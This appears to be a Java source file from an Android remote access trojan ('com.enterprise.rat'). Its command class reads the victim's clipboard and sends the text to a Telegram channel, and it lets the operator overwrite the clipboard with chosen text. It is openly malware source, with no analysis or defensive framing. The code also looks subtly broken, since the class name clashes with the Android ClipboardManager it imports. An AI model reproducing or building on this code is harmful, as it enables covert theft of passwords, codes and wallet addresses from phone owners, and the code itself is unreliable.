package com.enterprise.rat.commands;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import com.enterprise.rat.utils.TelegramApi;

public class ClipboardManager {
    public static void getClipboard(Context context) {
        ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        if (cm.hasPrimaryClip()) {
            ClipData clip = cm.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                CharSequence text = clip.getItemAt(0).getText();
                TelegramApi.sendMessage("📋 <b>Clipboard:</b>\n<code>" + text + "</code>");
            } else TelegramApi.sendMessage("📋 Clipboard empty.");
        }
    }

    public static void setClipboard(Context context, String text) {
        ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
        cm.setPrimaryClip(ClipData.newPlainText("REX", text));
        TelegramApi.sendMessage("✅ Clipboard set.");
    }
}
